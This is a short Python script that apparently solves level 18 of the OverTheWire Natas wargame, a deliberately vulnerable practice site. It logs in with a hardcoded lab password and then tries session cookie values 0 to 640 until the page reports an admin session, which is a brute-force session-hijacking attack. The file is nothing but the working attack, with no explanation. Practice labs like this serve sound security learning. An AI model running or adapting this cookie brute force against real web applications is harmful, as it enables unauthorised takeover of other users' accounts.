import requests
import time
#Function to stablish connection
def start_session(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session

if __name__ == '__main__':
    username = 'natas18'
    password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
    url = 'http://natas18.natas.labs.overthewire.org/'
    session = start_session(username,password,url)
    payload = {'debug':'True','username':'admin','password':'admin'}
    for i in range(0,641):
        r=session.post(url,auth=(username,password),data=payload,cookies={'PHPSESSID':str(i)})
        if 'You are an admin' in r.content.decode():
            print(r.content)